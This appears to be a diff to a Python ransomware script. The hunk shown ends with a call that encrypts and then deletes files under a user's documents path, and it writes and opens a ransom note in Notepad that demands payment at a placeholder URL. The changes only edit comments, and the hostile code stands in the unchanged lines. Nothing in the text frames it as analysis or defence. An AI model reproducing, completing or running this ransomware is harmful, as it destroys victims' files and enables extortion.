@@ -44,15 +44,13 @@ def encrypt_files(directory):
                 encrypted_file.write(encrypted_data)
             os.remove(file_path)
 
-documents_path = "C:\\Users\\THE PATH TO ENCRYPT"  # Update this path to your documents directory
+documents_path = "C:\\Users\\THE PATH TO ENCRYPT"
 encrypt_files(documents_path)
 
-# Open Notepad and write the ransom message
-# Create a temporary text file with the ransom message
+# It Opens Notepad and write the ransom message in it
 ransom_message = "All your files have been encrypted! Please go to this link to pay the ransom and decrypt your files: https://PUT_YOUR_URL.com"
 temp_message_file_path = "ransom_message.txt"
 with open(temp_message_file_path, "w") as message_file:
     message_file.write(ransom_message)
 
-# Open the temporary file with Notepad
 subprocess.run(["notepad.exe", temp_message_file_path])
